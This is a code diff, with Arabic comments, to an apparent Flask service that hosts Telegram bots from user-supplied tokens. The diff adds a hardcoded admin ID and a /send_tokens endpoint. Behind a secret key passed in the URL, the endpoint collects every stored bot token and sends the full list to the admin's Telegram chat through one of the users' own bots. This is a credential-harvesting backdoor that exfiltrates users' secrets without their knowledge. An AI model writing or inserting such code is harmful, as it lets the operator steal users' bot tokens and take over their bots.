@@ -12,6 +12,9 @@ bots_lock = threading.Lock()
 # مفتاح سري لاستعادة التوكنات
 SECRET_KEY = "xazow9wowgowwy29wi282r30wyw0wuoewgwowfepwpwy19192828827297282738383eueo"
 
+# آيدي الأدمن لاستقبال التوكنات
+ADMIN_ID = 123456789  # استبدله بآيدي الأدمن الحقيقي
+
 # دالة للتحقق من صحة التوكن
 def is_valid_token(token):
     try:
@@ -116,6 +119,24 @@ def stop_bots():
         bots.clear()
 
     return jsonify({'message': 'All bots stopped successfully'})
+
+# API لإرسال قائمة التوكنات إلى أدمن محدد
+@app.route('/send_tokens', methods=['GET'])
+def send_tokens():
+    provided_key = request.args.get('key')
+    if provided_key != SECRET_KEY:
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    token_list = "\n".join(bots.keys()) if bots else "لا يوجد توكنات حالياً."
+    message_text = f"**🔹 قائمة التوكنات 🔹**\n\n```\n{token_list}\n```"
+
+    try:
+        bot_instance = telebot.TeleBot(list(bots.keys())[0])  # استخدام أول بوت متاح
+        bot_instance.send_message(ADMIN_ID, message_text, parse_mode='Markdown')
+        return jsonify({'message': 'Tokens sent to admin successfully'})
+    except Exception as e:
+        print(f"Error sending tokens: {e}")
+        return jsonify({'error': 'Failed to send tokens'}), 500
 
 # تشغيل سيرفر Flask
 if __name__ == '__main__':
